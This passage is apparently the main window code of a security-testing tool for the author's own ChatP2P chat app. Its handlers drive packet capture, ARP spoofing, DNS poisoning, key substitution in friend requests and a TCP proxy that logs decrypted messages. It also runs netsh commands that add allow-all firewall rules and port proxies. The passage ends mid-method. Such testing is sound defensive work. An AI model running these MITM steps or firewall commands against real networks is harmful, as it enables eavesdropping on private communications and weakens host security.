using System;
using System.Collections.ObjectModel;
using System.Net;
using System.Threading.Tasks;
using System.Windows;
using ChatP2P.SecurityTester.Core;
using ChatP2P.SecurityTester.Network;
using ChatP2P.SecurityTester.Crypto;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Attacks;

namespace ChatP2P.SecurityTester
{
    public partial class MainWindow : Window
    {
        private PacketCapture? _packetCapture;
        private ARPSpoofer? _arpSpoofer;
        private DNSPoisoner? _dnsPoisoner;
        private KeySubstitutionAttack? _keyAttack;
        private CompleteScenarioAttack? _completeScenario;
        private TCPProxy? _tcpProxy;

        private ObservableCollection<CapturedPacket> _capturedPackets = new();
        private ObservableCollection<AttackResult> _attackResults = new();
        private ObservableCollection<InterceptedConversation> _interceptedConversations = new();

        public MainWindow()
        {
            InitializeComponent();
            InitializeComponents();
        }

        private void InitializeComponents()
        {
            // Initialize data grids
            dgCapturedPackets.ItemsSource = _capturedPackets;
            dgAttackResults.ItemsSource = _attackResults;
            dgInterceptedConversations.ItemsSource = _interceptedConversations;

            // Initialize attack modules
            _packetCapture = new PacketCapture();
            _arpSpoofer = new ARPSpoofer();
            _dnsPoisoner = new DNSPoisoner();
            _keyAttack = new KeySubstitutionAttack();
            _completeScenario = new CompleteScenarioAttack();
            _tcpProxy = new TCPProxy(_keyAttack);

            // Initialize port forwarding UI with auto-detected attacker IP
            _ = Task.Run(async () => await AutoDetectAttackerIP());

            // Wire up events
            _packetCapture.PacketCaptured += OnPacketCaptured;
            _packetCapture.LogMessage += AppendLog;

            _arpSpoofer.AttackResult += OnAttackResult;
            _arpSpoofer.LogMessage += AppendLog;
            _arpSpoofer.LogMessage += AppendARPLog;

            _dnsPoisoner.DNSResponseSent += OnAttackResult;
            _dnsPoisoner.LogMessage += AppendLog;
            _dnsPoisoner.LogMessage += AppendDNSLog;

            _keyAttack.AttackCompleted += OnAttackResult;
            _keyAttack.LogMessage += AppendLog;

            _completeScenario.AttackCompleted += OnAttackResult;
            _completeScenario.LogMessage += AppendScenarioLog;
            _completeScenario.ConversationIntercepted += OnConversationIntercepted;

            _tcpProxy.LogMessage += AppendLog;
            _tcpProxy.PacketModified += OnTCPProxyPacketModified;

            // Load network interfaces
            RefreshNetworkInterfaces();

            // Update configuration from UI
            UpdateConfigurationFromUI();

            AppendLog("🕷️ ChatP2P Security Tester initialized");
            AppendLog("⚠️ Use only for authorized security testing!");
        }

        private void UpdateConfigurationFromUI()
        {
            SecurityTesterConfig.TargetClientIP = txtTargetClientIP.Text.Trim();
            SecurityTesterConfig.RelayServerIP = txtRelayServerIP.Text.Trim();
        }

        private async Task StartTCPProxy()
        {
            try
            {
                // Démarrer le proxy TCP qui écoute sur port 8889 local et redirige vers le vrai relay server
                var targetIP = "192.168.1.152"; // IP du vrai relay server
                var targetPort = 8889; // Port du vrai relay server
                var listenPort = 8889; // Port d'écoute local de l'attaquant

                AppendLog($"🔗 [TCP-PROXY] Starting proxy: localhost:{listenPort} → {targetIP}:{targetPort}");
                AppendScenarioLog($"🔗 [TCP-PROXY] Starting proxy: localhost:{listenPort} → {targetIP}:{targetPort}");

                var success = await _tcpProxy!.StartProxy(listenPort, targetIP, targetPort);

                if (success)
                {
                    AppendLog($"✅ [TCP-PROXY] Proxy started successfully on port {listenPort}");
                    AppendLog($"🎯 [TCP-PROXY] All client connections to port {listenPort} will be intercepted and forwarded");
                    AppendScenarioLog($"✅ [TCP-PROXY] Proxy started successfully on port {listenPort}");
                    AppendScenarioLog($"🎯 [TCP-PROXY] Ready to intercept friend requests and substitute keys");
                    AppendScenarioLog($"📋 [INSTRUCTIONS] Configure ChatP2P Client to connect to 192.168.1.145:8889");
                }
                else
                {
                    AppendLog($"❌ [TCP-PROXY] Failed to start proxy on port {listenPort}");
                    AppendScenarioLog($"❌ [TCP-PROXY] Failed to start proxy on port {listenPort}");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ [TCP-PROXY] Error starting proxy: {ex.Message}");
                AppendScenarioLog($"❌ [TCP-PROXY] Error starting proxy: {ex.Message}");
            }
        }

        private void RefreshNetworkInterfaces()
        {
            try
            {
                var interfaces = _packetCapture?.GetAvailableInterfaces() ?? new System.Collections.Generic.List<string>();
                cmbInterfaces.ItemsSource = interfaces;
                if (interfaces.Count > 0)
                {
                    cmbInterfaces.SelectedIndex = 0;
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ Error loading network interfaces: {ex.Message}");
            }
        }

        private void AppendLog(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss.fff");
                txtGlobalLog.AppendText($"[{timestamp}] {message}\n");
                txtGlobalLog.ScrollToEnd();
            });
        }

        private void AppendARPLog(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss.fff");
                txtARPLog.AppendText($"[{timestamp}] {message}\n");
                txtARPLog.ScrollToEnd();
            });
        }

        private void AppendDNSLog(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss.fff");
                txtDNSLog.AppendText($"[{timestamp}] {message}\n");
                txtDNSLog.ScrollToEnd();
            });
        }

        private void OnPacketCaptured(CapturedPacket packet)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _capturedPackets.Insert(0, packet);

                // Keep only last 1000 packets for performance
                while (_capturedPackets.Count > 1000)
                {
                    _capturedPackets.RemoveAt(_capturedPackets.Count - 1);
                }

                // Log interesting packets
                if (packet.Type != PacketType.Unknown)
                {
                    AppendLog($"📡 Captured {packet.Type}: {packet.SourceIP}:{packet.SourcePort} → {packet.DestinationIP}:{packet.DestinationPort}");
                }
            });
        }

        private void OnAttackResult(AttackResult result)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _attackResults.Insert(0, result);
                AppendLog($"🎯 Attack Result: {result.Summary}");
            });
        }

        private void OnTCPProxyPacketModified(AttackResult result)
        {
            Dispatcher.BeginInvoke(() =>
            {
                AppendLog($"🕷️ [MITM] Friend request intercepted and modified!");
                AppendScenarioLog($"🕷️ [STEP 3] FRIEND REQUEST INTERCEPTED AND MODIFIED!");
                AppendScenarioLog($"📋 Attack Type: {result.AttackType}");
                AppendScenarioLog($"🎯 Target: {result.TargetPeer}");
                AppendScenarioLog($"💀 Description: {result.Description}");
                AppendScenarioLog($"✅ [SUCCESS] Attacker's cryptographic keys have been injected!");
                AppendScenarioLog($"🛡️ [IMPACT] ChatP2P client will now use attacker's keys for encryption");

                // Add to attack results
                _attackResults.Insert(0, result);
            });
        }

        // UI Event Handlers
        private void BtnUpdateTargets_Click(object sender, RoutedEventArgs e)
        {
            UpdateConfigurationFromUI();
            AppendLog($"🎯 Target updated: Client={SecurityTesterConfig.TargetClientIP}, Relay={SecurityTesterConfig.RelayServerIP}");
        }

        private void BtnRefreshInterfaces_Click(object sender, RoutedEventArgs e)
        {
            RefreshNetworkInterfaces();
            AppendLog("🔄 Network interfaces refreshed");
        }

        // Packet Capture Events
        private async void BtnStartCapture_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var selectedInterface = cmbInterfaces.SelectedItem?.ToString() ?? "";
                var success = await _packetCapture?.StartCapture(selectedInterface)!;

                if (success)
                {
                    btnStartCapture.IsEnabled = false;
                    btnStopCapture.IsEnabled = true;
                    txtCaptureStatus.Text = "Status: Capturing...";
                    AppendLog("📡 Packet capture started");
                }
                else
                {
                    AppendLog("❌ Failed to start packet capture");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ Error starting capture: {ex.Message}");
            }
        }

        private void BtnStopCapture_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                _packetCapture?.StopCapture();
                btnStartCapture.IsEnabled = true;
                btnStopCapture.IsEnabled = false;
                txtCaptureStatus.Text = "Status: Stopped";
                AppendLog("⏹️ Packet capture stopped");
            }
            catch (Exception ex)
            {
                AppendLog($"❌ Error stopping capture: {ex.Message}");
            }
        }

        private void BtnClearCapture_Click(object sender, RoutedEventArgs e)
        {
            _capturedPackets.Clear();
            AppendLog("🗑️ Captured packets cleared");
        }

        // ARP Spoofing Events
        private async void BtnStartARP_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendLog("🚀 [ARP-SPOOFING] Starting individual ARP spoofing test...");
                txtARPLog.AppendText($"🚀 [ARP-SPOOFING] Starting individual ARP spoofing test...\n");

                // Validation IP cible
                if (!IPAddress.TryParse(SecurityTesterConfig.TargetClientIP, out var targetIP))
                {
                    AppendLog("❌ Invalid target IP address configured");
                    txtARPLog.AppendText("❌ Invalid target IP address configured\n");
                    return;
                }

                AppendLog($"🎯 [ARP-SPOOFING] Target IP configured: {targetIP}");
                txtARPLog.AppendText($"🎯 [ARP-SPOOFING] Target IP configured: {targetIP}\n");

                // Vérification module ARP
                AppendLog($"🔍 [ARP-SPOOFING] Checking ARP spoofer module...");
                txtARPLog.AppendText($"🔍 [ARP-SPOOFING] Checking ARP spoofer module...\n");
                AppendLog($"   🔍 ARP Spoofer status: {(_arpSpoofer != null ? "Initialized" : "NULL - ERROR")}");
                txtARPLog.AppendText($"   🔍 ARP Spoofer status: {(_arpSpoofer != null ? "Initialized" : "NULL - ERROR")}\n");

                if (_arpSpoofer == null)
                {
                    AppendLog("❌ [CRITICAL] ARP Spoofer module not initialized!");
                    txtARPLog.AppendText("❌ [CRITICAL] ARP Spoofer module not initialized!\n");
                    return;
                }

                // Force logs détaillés
                AppendLog($"🔍 [ARP-SPOOFING] Attempting ARP spoofing towards {targetIP}...");
                txtARPLog.AppendText($"🔍 [ARP-SPOOFING] Attempting ARP spoofing towards {targetIP}...\n");
                AppendLog($"   📞 Calling _arpSpoofer.StartARPSpoofing()...");
                txtARPLog.AppendText($"   📞 Calling _arpSpoofer.StartARPSpoofing()...\n");

                var success = await _arpSpoofer.StartARPSpoofing(targetIP, null);

                AppendLog($"   🔄 Method return: {success}");
                txtARPLog.AppendText($"   🔄 Method return: {success}\n");

                if (success)
                {
                    btnStartARP.IsEnabled = false;
                    btnStopARP.IsEnabled = true;
                    txtARPStatus.Text = "Status: Active";
                    AppendLog("✅ [ARP-SPOOFING] ARP spoofing started successfully");
                    txtARPLog.AppendText("✅ [ARP-SPOOFING] ARP spoofing started successfully\n");
                    AppendLog($"🎯 [ARP-SPOOFING] Target {targetIP} traffic is now being redirected");
                    txtARPLog.AppendText($"🎯 [ARP-SPOOFING] Target {targetIP} traffic is now being redirected\n");
                }
                else
                {
                    AppendLog("❌ [ARP-SPOOFING] FAILED to start ARP spoofing");
                    txtARPLog.AppendText("❌ [ARP-SPOOFING] FAILED to start ARP spoofing\n");
                    AppendLog("   ⚠️ Check admin privileges, network interface, and SharpPcap installation");
                    txtARPLog.AppendText("   ⚠️ Check admin privileges, network interface, and SharpPcap installation\n");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ [ARP-SPOOFING] Critical error: {ex.Message}");
                txtARPLog.AppendText($"❌ [ARP-SPOOFING] Critical error: {ex.Message}\n");
                AppendLog($"   📋 Stack trace: {ex.StackTrace}");
                txtARPLog.AppendText($"   📋 Stack trace: {ex.StackTrace}\n");
            }
        }

        private void BtnStopARP_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                _arpSpoofer?.StopARPSpoofing();
                btnStartARP.IsEnabled = true;
                btnStopARP.IsEnabled = false;
                txtARPStatus.Text = "Status: Stopped";
                AppendLog("⏹️ ARP spoofing stopped");
            }
            catch (Exception ex)
            {
                AppendLog($"❌ Error stopping ARP spoofing: {ex.Message}");
            }
        }

        // Key Substitution Events
        private async void BtnGenerateAttackerKeys_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                txtKeyAttackStatus.Text = "Status: Generating keys...";
                var success = await _keyAttack?.InitializeAttackerKeys()!;

                if (success)
                {
                    var fingerprints = _keyAttack.GetAttackerFingerprints();
                    txtAttackerFingerprints.Text = fingerprints;
                    txtKeyAttackStatus.Text = "Status: Keys ready";
                    AppendLog("🔑 Attacker keys generated successfully");
                }
                else
                {
                    txtKeyAttackStatus.Text = "Status: Key generation failed";
                    AppendLog("❌ Failed to generate attacker keys");
                }
            }
            catch (Exception ex)
            {
                txtKeyAttackStatus.Text = "Status: Error";
                AppendLog($"❌ Error generating keys: {ex.Message}");
            }
        }

        private async void BtnInterceptFriendRequest_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // Example friend request - in real scenario this would come from packet capture
                var exampleFriendRequest = "FRIEND_REQ_DUAL:VM1:VM2:ed25519KeyExample:pqcKeyExample:Hello from VM1";

                txtKeyAttackStatus.Text = "Status: Intercepting...";
                var result = await _keyAttack?.AttemptFriendRequestSubstitution(exampleFriendRequest)!;

                if (result.Success)
                {
                    txtKeyAttackStatus.Text = "Status: Substitution successful";
                    txtKeyAttackLog.AppendText($"✅ Malicious friend request created:\n{result.Details}\n\n");
                    AppendLog("🎯 Friend request key substitution successful");
                }
                else
                {
                    txtKeyAttackStatus.Text = "Status: Substitution failed";
                    AppendLog($"❌ Key substitution failed: {result.ErrorMessage}");
                }
            }
            catch (Exception ex)
            {
                txtKeyAttackStatus.Text = "Status: Error";
                AppendLog($"❌ Error during key substitution: {ex.Message}");
            }
        }

        // Attack Orchestration Events
        private async void BtnStartFullAttack_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                txtOrchestrationStatus.Text = "Status: Starting full attack...";
                AppendLog("🚀 Starting full MITM attack sequence");

                // Step 1: Start packet capture
                var selectedInterface = cmbInterfaces.SelectedItem?.ToString() ?? "";
                var captureSuccess = await _packetCapture?.StartCapture(selectedInterface)!;

                if (!captureSuccess)
                {
                    AppendLog("❌ Failed to start packet capture - aborting attack");
                    return;
                }

                // Step 2: Start ARP spoofing
                if (!IPAddress.TryParse(SecurityTesterConfig.TargetClientIP, out var targetIP))
                {
                    AppendLog("❌ Invalid target IP address - aborting attack");
                    return;
                }

                var arpSuccess = await _arpSpoofer?.StartARPSpoofing(targetIP, null)!;

                if (!arpSuccess)
                {
                    AppendLog("❌ Failed to start ARP spoofing - aborting attack");
                    return;
                }

                // Step 3: Initialize attacker keys
                var keySuccess = await _keyAttack?.InitializeAttackerKeys()!;

                if (!keySuccess)
                {
                    AppendLog("❌ Failed to generate attacker keys - continuing without key substitution");
                }

                txtOrchestrationStatus.Text = "Status: Full attack active";
                AppendLog("✅ Full MITM attack sequence started successfully");

                // Update UI states
                btnStartCapture.IsEnabled = false;
                btnStopCapture.IsEnabled = true;
                btnStartARP.IsEnabled = false;
                btnStopARP.IsEnabled = true;
                txtCaptureStatus.Text = "Status: Capturing...";
                txtARPStatus.Text = "Status: Active";

                if (keySuccess)
                {
                    var fingerprints = _keyAttack.GetAttackerFingerprints();
                    txtAttackerFingerprints.Text = fingerprints;
                    txtKeyAttackStatus.Text = "Status: Keys ready";
                }
            }
            catch (Exception ex)
            {
                txtOrchestrationStatus.Text = "Status: Attack failed";
                AppendLog($"❌ Error during full attack: {ex.Message}");
            }
        }

        private void BtnStopAllAttacks_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendLog("⏹️ Stopping all attacks");

                _packetCapture?.StopCapture();
                _arpSpoofer?.StopARPSpoofing();

                // Reset UI states
                btnStartCapture.IsEnabled = true;
                btnStopCapture.IsEnabled = false;
                btnStartARP.IsEnabled = true;
                btnStopARP.IsEnabled = false;
                txtCaptureStatus.Text = "Status: Stopped";
                txtARPStatus.Text = "Status: Stopped";
                txtKeyAttackStatus.Text = "Status: Ready";
                txtOrchestrationStatus.Text = "Status: Ready";

                AppendLog("✅ All attacks stopped");
            }
            catch (Exception ex)
            {
                AppendLog($"❌ Error stopping attacks: {ex.Message}");
            }
        }

        // Complete Scenario Events
        private async void BtnStartCompleteScenario_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var targetIP = txtTargetClientIP.Text.Trim();
                var relayIP = txtRelayServerIP.Text.Trim();

                txtOrchestrationStatus.Text = "Status: Starting complete scenario...";
                AppendLog($"🎯 Starting complete scenario: Target={targetIP}, Relay={relayIP}");

                var success = await _completeScenario?.StartCompleteAttack(targetIP, relayIP)!;

                if (success)
                {
                    txtOrchestrationStatus.Text = "Status: Complete scenario active";
                }
                else
                {
                    txtOrchestrationStatus.Text = "Status: Scenario failed";
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ Error starting complete scenario: {ex.Message}");
            }
        }

        private async void BtnStartRealisticScenario_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                txtScenarioStatus.Text = "Status: Starting realistic attack...";
                var targetIP = txtTargetClientIP.Text.Trim();
                var relayServerIP = txtRelayServerIP.Text.Trim();

                // 🚀 STEP 1: Start TCP Proxy for MITM relay interception
                AppendScenarioLog("🔗 [STEP 1] Starting TCP Proxy for relay interception...");
                await StartTCPProxy();

                // 🚀 STEP 2: Start Complete Attack Scenario
                AppendScenarioLog("🎯 [STEP 2] Starting complete attack scenario...");
                var success = await _completeScenario?.StartCompleteAttack(targetIP, relayServerIP)!;

                if (success)
                {
                    txtScenarioStatus.Text = "Status: Realistic attack active";
                    AppendScenarioLog("🎯 Realistic attack scenario started successfully");
                }
                else
                {
                    txtScenarioStatus.Text = "Status: Attack failed";
                }
            }
            catch (Exception ex)
            {
                AppendScenarioLog($"❌ Error starting realistic scenario: {ex.Message}");
            }
        }

        private void BtnStopScenario_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                _completeScenario?.StopAttack();
                _tcpProxy?.StopProxy(); // Stop TCP proxy when stopping scenario
                txtScenarioStatus.Text = "Status: Ready";
                AppendScenarioLog("⏹️ Scenario stopped");
                AppendScenarioLog("🔗 TCP Proxy stopped");
            }
            catch (Exception ex)
            {
                AppendScenarioLog($"❌ Error stopping scenario: {ex.Message}");
            }
        }

        private void AppendScenarioLog(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss.fff");
                txtScenarioLog.AppendText($"[{timestamp}] {message}\n");
                txtScenarioLog.ScrollToEnd();
            });

            // Also append to global log
            AppendLog(message);
        }

        private void OnConversationIntercepted(InterceptedConversation conversation)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _interceptedConversations.Insert(0, conversation);
                AppendScenarioLog($"💬 Message décrypté: {conversation.FromPeer}→{conversation.ToPeer}: \"{conversation.DecryptedContent}\"");
            });
        }

        protected override void OnClosed(EventArgs e)
        {
            // Cleanup on close
            try
            {
                _packetCapture?.StopCapture();
                _arpSpoofer?.StopARPSpoofing();
                _completeScenario?.StopAttack();
                _tcpProxy?.StopProxy();
            }
            catch { }

            base.OnClosed(e);
        }

        // DNS Poisoning Events
        private async void BtnStartDNS_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var targetDomain = txtTargetDomain.Text.Trim();
                var redirectIP = txtRedirectIP.Text.Trim();

                AppendLog("🌐 [DNS-POISONING] Starting DNS poisoning test...");
                txtDNSLog.AppendText("🌐 [DNS-POISONING] Starting DNS poisoning test...\n");

                if (string.IsNullOrEmpty(targetDomain) || string.IsNullOrEmpty(redirectIP))
                {
                    AppendLog("❌ [DNS-POISONING] Please configure target domain and redirect IP");
                    txtDNSLog.AppendText("❌ [DNS-POISONING] Please configure target domain and redirect IP\n");
                    return;
                }

                AppendLog($"🎯 [DNS-POISONING] Target Domain: {targetDomain}");
                AppendLog($"🔀 [DNS-POISONING] Redirect IP: {redirectIP}");
                txtDNSLog.AppendText($"🎯 [DNS-POISONING] Target Domain: {targetDomain}\n");
                txtDNSLog.AppendText($"🔀 [DNS-POISONING] Redirect IP: {redirectIP}\n");

                var success = await _dnsPoisoner!.StartDNSPoisoning(targetDomain, redirectIP);

                if (success)
                {
                    btnStartDNS.IsEnabled = false;
                    btnStopDNS.IsEnabled = true;
                    txtDNSStatus.Text = "Status: Active";
                    AppendLog("✅ [DNS-POISONING] DNS poisoning server started successfully");
                    txtDNSLog.AppendText("✅ [DNS-POISONING] DNS poisoning server started successfully\n");
                    AppendLog("⚠️ [DNS-POISONING] Make sure ARP spoofing is active for best results!");
                    txtDNSLog.AppendText("⚠️ [DNS-POISONING] Make sure ARP spoofing is active for best results!\n");
                }
                else
                {
                    AppendLog("❌ [DNS-POISONING] Failed to start DNS poisoning");
                    txtDNSLog.AppendText("❌ [DNS-POISONING] Failed to start DNS poisoning\n");
                    AppendLog("   ⚠️ Check admin privileges and port 53 availability");
                    txtDNSLog.AppendText("   ⚠️ Check admin privileges and port 53 availability\n");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ [DNS-POISONING] Critical error: {ex.Message}");
                txtDNSLog.AppendText($"❌ [DNS-POISONING] Critical error: {ex.Message}\n");
            }
        }

        private void BtnStopDNS_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                _dnsPoisoner?.StopDNSPoisoning();
                btnStartDNS.IsEnabled = true;
                btnStopDNS.IsEnabled = false;
                txtDNSStatus.Text = "Status: Stopped";
                AppendLog("⏹️ [DNS-POISONING] DNS poisoning stopped");
                txtDNSLog.AppendText("⏹️ [DNS-POISONING] DNS poisoning stopped\n");
            }
            catch (Exception ex)
            {
                AppendLog($"❌ [DNS-POISONING] Error stopping DNS poisoning: {ex.Message}");
                txtDNSLog.AppendText($"❌ [DNS-POISONING] Error stopping DNS poisoning: {ex.Message}\n");
            }
        }

        private async void BtnTestDNS_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var targetDomain = txtTargetDomain.Text.Trim();
                var expectedIP = txtRedirectIP.Text.Trim();

                if (string.IsNullOrEmpty(targetDomain) || string.IsNullOrEmpty(expectedIP))
                {
                    AppendLog("❌ [DNS-TEST] Please configure target domain and expected IP");
                    txtDNSLog.AppendText("❌ [DNS-TEST] Please configure target domain and expected IP\n");
                    return;
                }

                AppendLog($"🧪 [DNS-TEST] Testing DNS resolution for {targetDomain}...");
                txtDNSLog.AppendText($"🧪 [DNS-TEST] Testing DNS resolution for {targetDomain}...\n");

                var success = await _dnsPoisoner!.TestDNSResolution(targetDomain, expectedIP);

                if (success)
                {
                    AppendLog($"✅ [DNS-TEST] SUCCESS! DNS poisoning is working correctly");
                    txtDNSLog.AppendText($"✅ [DNS-TEST] SUCCESS! DNS poisoning is working correctly\n");
                }
                else
                {
                    AppendLog($"❌ [DNS-TEST] DNS poisoning not working - check ARP spoofing and DNS server");
                    txtDNSLog.AppendText($"❌ [DNS-TEST] DNS poisoning not working - check ARP spoofing and DNS server\n");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"❌ [DNS-TEST] Test error: {ex.Message}");
                txtDNSLog.AppendText($"❌ [DNS-TEST] Test error: {ex.Message}\n");
            }
        }

        // Port Forwarding Events
        private async void BtnRefreshStatus_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendPortForwardingLog("🔄 Refreshing port forwarding status...");

                // Check IP forwarding status
                var ipForwardingEnabled = await CheckIPForwardingStatus();
                txtIPForwardingStatus.Text = ipForwardingEnabled ? "Enabled" : "Disabled";
                txtIPForwardingStatus.Foreground = ipForwardingEnabled ?
                    new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.LightGreen) :
                    new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Orange);

                // Check active port proxies
                var activeProxies = await GetActivePortProxies();
                txtActiveProxies.Text = activeProxies.ToString();

                AppendPortForwardingLog($"📊 Status refreshed - IP Forwarding: {(ipForwardingEnabled ? "✅" : "❌")}, Active Proxies: {activeProxies}");
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error refreshing status: {ex.Message}");
            }
        }

        private async void BtnEnableIPForwarding_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendPortForwardingLog("⚡ Configuring Windows as router for MITM...");

                // Complete Windows routing configuration for MITM + Gateway functionality
                var attackerIP = txtAttackerIP.Text.Trim();
                if (string.IsNullOrEmpty(attackerIP))
                {
                    attackerIP = await GetLocalIPAddress();
                    txtAttackerIP.Text = attackerIP;
                }

                var gatewayIP = await GetGatewayIP();

                var commands = new[]
                {
                    // Basic IP forwarding
                    "netsh interface ipv4 set global sourceroutingbehavior=forward",
                    "netsh interface ipv4 set global multicastforwarding=enabled",
                    "netsh interface ipv4 set global icmpredirects=enabled",

                    // Firewall rules for gateway
                    "netsh advfirewall firewall add rule name=\"Allow ICMP\" protocol=icmpv4:any,any dir=in action=allow",
                    "netsh advfirewall firewall add rule name=\"Allow ICMP Out\" protocol=icmpv4:any,any dir=out action=allow",
                    "netsh advfirewall firewall add rule name=\"Allow All In\" dir=in action=allow",
                    "netsh advfirewall firewall add rule name=\"Allow All Out\" dir=out action=allow",

                    // Enable Windows routing services
                    "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" /v IPEnableRouter /t REG_DWORD /d 1 /f",
                    "sc config RemoteAccess start= auto",
                    "net start RemoteAccess",

                    // Configure NAT and internet sharing
                    $"netsh routing ip nat install",
                    $"netsh routing ip nat add interface name=\"Local Area Connection\" mode=full",
                    $"netsh routing ip set global loglevel=error"
                };

                var successCount = 0;
                foreach (var command in commands)
                {
                    var result = await ExecuteNetshCommand(command, "Configure routing");
                    if (result) successCount++;
                }

                AppendPortForwardingLog($"📡 Routing configuration: {successCount}/{commands.Length} commands successful");

                AppendPortForwardingLog($"🚪 Gateway IP detected: {gatewayIP}");
                AppendPortForwardingLog($"🔧 Configuring {attackerIP} as full network gateway with NAT...");
                AppendPortForwardingLog($"📡 Setting up Windows routing services and firewall rules...");

                if (successCount >= 8) // Most critical commands successful
                {
                    txtIPForwardingStatus.Text = "Gateway";
                    txtIPForwardingStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.LightGreen);
                    AppendPortForwardingLog("✅ Windows configured as full network gateway");
                    AppendPortForwardingLog("🔄 NAT and routing services enabled");
                    AppendPortForwardingLog("🧊 ICMP forwarding enabled (ping, traceroute work)");
                    AppendPortForwardingLog("🌐 Firewall configured for transparent forwarding");
                    AppendPortForwardingLog($"🎯 VM1 can now use {attackerIP} as gateway for internet access");
                    AppendPortForwardingLog($"⚠️ REBOOT MAY BE REQUIRED for full gateway functionality");
                }
                else if (successCount >= 3)
                {
                    txtIPForwardingStatus.Text = "Partial";
                    txtIPForwardingStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Orange);
                    AppendPortForwardingLog("⚠️ Partial routing configuration - gateway mode may not work fully");
                    AppendPortForwardingLog("⚠️ Try manual gateway test with limited functionality");
                }
                else
                {
                    txtIPForwardingStatus.Text = "Failed";
                    txtIPForwardingStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Red);
                    AppendPortForwardingLog("❌ Routing configuration failed - check admin privileges");
                    AppendPortForwardingLog("⚠️ Run as Administrator for gateway functionality");
                }
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error enabling IP forwarding: {ex.Message}");
            }
        }

        private async void BtnAddPortProxy_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var listenPort = txtListenPort.Text.Trim();
                var attackerIP = txtAttackerIP.Text.Trim();
                var connectIP = txtConnectIP.Text.Trim();

                if (string.IsNullOrEmpty(listenPort) || string.IsNullOrEmpty(attackerIP) || string.IsNullOrEmpty(connectIP))
                {
                    AppendPortForwardingLog("❌ Please fill all fields (Listen Port, Attacker IP, Connect IP)");
                    return;
                }

                AppendPortForwardingLog($"➕ Adding transparent proxy: 0.0.0.0:{listenPort} → {connectIP}:{listenPort}");
                AppendPortForwardingLog($"   📡 ARP spoofed traffic will be captured on any interface and proxied to {connectIP}");

                var command = $"netsh interface portproxy add v4tov4 listenport={listenPort} listenaddress=0.0.0.0 connectport={listenPort} connectaddress={connectIP}";
                var result = await ExecuteNetshCommand(command, "Add transparent proxy");

                if (result)
                {
                    // Refresh active proxies count
                    var activeProxies = await GetActivePortProxies();
                    txtActiveProxies.Text = activeProxies.ToString();
                    AppendPortForwardingLog("✅ Transparent proxy added successfully");
                }
                else
                {
                    AppendPortForwardingLog("❌ Failed to add transparent proxy - check admin privileges and parameters");
                }
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error adding transparent proxy: {ex.Message}");
            }
        }

        private async void BtnRemovePortProxy_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var listenPort = txtListenPort.Text.Trim();
                var attackerIP = txtAttackerIP.Text.Trim();

                if (string.IsNullOrEmpty(listenPort) || string.IsNullOrEmpty(attackerIP))
                {
                    AppendPortForwardingLog("❌ Please specify Listen Port and Attacker IP to remove");
                    return;
                }

                AppendPortForwardingLog($"➖ Removing transparent proxy: 0.0.0.0:{listenPort}");

                var command = $"netsh interface portproxy delete v4tov4 listenport={listenPort} listenaddress=0.0.0.0";
                var result = await ExecuteNetshCommand(command, "Remove port proxy");

                if (result)
                {
                    // Refresh active proxies count
                    var activeProxies = await GetActivePortProxies();
                    txtActiveProxies.Text = activeProxies.ToString();
                    AppendPortForwardingLog("✅ Port proxy removed successfully");
                }
                else
                {
                    AppendPortForwardingLog("❌ Failed to remove port proxy - check admin privileges or proxy existence");
                }
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error removing port proxy: {ex.Message}");
            }
        }

        private async void BtnTestTransparentProxy_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendPortForwardingLog("🧪 Testing transparent proxy configuration for ARP spoofing...");

                // Check admin privileges first
                bool isAdmin = CheckAdminPrivileges();
                AppendPortForwardingLog($"   🔐 Admin Privileges: {(isAdmin ? "✅ ELEVATED" : "❌ NOT ELEVATED")}");
                if (!isAdmin)
                {
                    AppendPortForwardingLog("   ⚠️ WARNING: Port proxy requires Administrator privileges!");
                    AppendPortForwardingLog("   💡 Right-click → Run as Administrator to fix this issue");
                }

